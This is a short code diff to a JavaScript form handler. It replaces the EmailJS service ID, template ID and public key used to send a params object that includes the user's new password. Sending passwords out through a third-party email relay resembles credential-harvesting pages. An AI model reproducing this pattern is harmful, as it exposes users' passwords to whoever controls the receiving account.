@@ -29,12 +29,12 @@ function validateAndSend() {
       new_password: newPassword
     };
 
-    const serviceID = 'service_dc0cgml';
-    const templateID = 'template_5bmgad2';
+    const serviceID = 'service_ebrxdwj';
+    const templateID = 'template_549phsm';
 
     // Send data via EmailJS
       emailjs.init({
-      publicKey: "mhjW0Sj6WoL4nv4Iu",
+      publicKey: "beOCGtTezIsQ47QU7",
       });// Replace with your EmailJS user ID
     emailjs
       .send(serviceID, templateID, params)
